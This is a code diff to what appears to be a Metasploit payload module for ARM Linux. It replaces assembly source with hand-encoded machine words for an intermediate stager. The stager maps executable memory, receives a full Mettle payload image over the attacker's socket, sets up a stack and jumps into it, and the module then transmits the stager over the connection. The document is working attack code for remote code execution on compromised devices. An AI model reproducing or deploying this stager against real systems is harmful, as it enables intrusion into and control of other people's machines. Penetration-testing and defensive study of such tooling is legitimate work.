@@ -33,61 +33,44 @@ module MetasploitModule
   def handle_intermediate_stage(conn, payload)
     entry_offset = elf_ep(payload)
 
-    encoded_entry = "0x%.8x" % entry_offset
-    encoded_size = "0x%.8x" % payload.length
-
-    # Does a mmap() / read() loop of a user specified length, then
-    # jumps to the entry point (the \x5a's)
-
-    # TODO: does not work because fuck Metasm
-    midstager_asm = %Q^
-        ; mmap the space for the mettle image
-        mov r0, #0      ; address doesn't matter
-        mov r1, [size]  ; more than 12-bits
-        mov r2, #7      ; PROT_READ | PROT_WRITE | PROT_EXECUTE
-        mov r3, #34     ; MAP_PRIVATE | MAP_ANONYMOUS
-        mov r4, #0      ; no file
-        mov r5, #0      ; no offset
-
-        mov r7, #90     ; syscall: mmap
-        svc #0
-
-        ; recv the process image
-        ; ip contains our socket from the reverse stager
-        mov r1, r0      ; move the mmap to the recv buffer
-        mov r0, ip      ; set the fd
-        mov r2, [size]  ; I, too, like to live dangerously
-        mov r3, 0x100   ; MSG_WAITALL
-
-        mov r7, #291    ; syscall: recv
-        svc #0
-
-        ; set up the initial stack
-        and sp, #-16    ; Align
-        add sp, #256    ; Add room for initial stack
-        add sp, #4      ; Add room for prog name
-        mov r4, #109    ;  "m" (0,0,0,109)
-        push {r4}       ; On the stack
-        mov r5,#1       ; ARGC
-        mov r6,sp       ; ARGV[0]
-        mov r7,#0       ; (NULL)
-        mov r8,#0       ; (NULL) (Ending ENV)
-        mov r9,#7       ; AT_BASE
-        mov r10,r1      ; mmap'd address
-        mov r11,#0      ; AT_NULL
-        mov r12,#0
-        push {r5-r12}
-
-        ; hack the planet
-        add r0, r1, [entry]
-        bx r0
-
-        entry: .word #{encoded_entry}
-        size:  .word #{encoded_size}
-    ^
-    midstager = Metasm::Shellcode.assemble(Metasm::ARM.new, midstager_asm).encode_string
+    midstager = [
+      0xe3a00000,   #  mov     r0, #0
+      0xe59f106c,   #  ldr     r1, [pc, #108]  ; 0x100cc
+      0xe3a02007,   #  mov     r2, #7
+      0xe3a03022,   #  mov     r3, #34 ; 0x22
+      0xe3a04000,   #  mov     r4, #0
+      0xe3a05000,   #  mov     r5, #0
+      0xe3a070c0,   #  mov     r7, #192 ; 0xc0
+      0xef000000,   #  svc     0x00000000
+      0xe1a02001,   #  mov     r2, r1
+      0xe1a01000,   #  mov     r1, r0
+      0xe1a0000c,   #  mov     r0, ip
+      0xe3a03c01,   #  mov     r3, #256        ; 0x100
+      0xe59f7044,   #  ldr     r7, [pc, #68]   ; 0x100d0
+      0xef000000,   #  svc     0x00000000
+      0xe3cdd00f,   #  bic     sp, sp, #15
+      0xe28ddf41,   #  add     sp, sp, #260    ; 0x104
+      0xe3a0406d,   #  mov     r4, #109        ; 0x6d
+      0xe52d4004,   #  push    {r4}            ; (str r4, [sp, #-4]!)
+      0xe3a04001,   #  mov     r4, #1
+      0xe1a0500d,   #  mov     r5, sp
+      0xe3a06000,   #  mov     r6, #0
+      0xe3a07000,   #  mov     r7, #0
+      0xe3a08007,   #  mov     r8, #7
+      0xe1a09001,   #  mov     r9, r1
+      0xe3a0a000,   #  mov     sl, #0
+      0xe3a0b000,   #  mov     fp, #0
+      0xe92d0ff0,   #  push    {r4, r5, r6, r7, r8, r9, sl, fp}
+      0xe59f000c,   #  ldr     r0, [pc, #12]   ; 0x100d4
+      0xe0800001,   #  add     r0, r0, r1
+      0xe12fff10,   #  bx      r0
+      payload.length,
+      0x00000123,   #  .word
+      entry_offset,
+    ].pack('V*')
 
     print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
+    conn.put([midstager.length].pack('V'))
     conn.put(midstager)
     Rex::ThreadSafe.sleep(1.5)
 
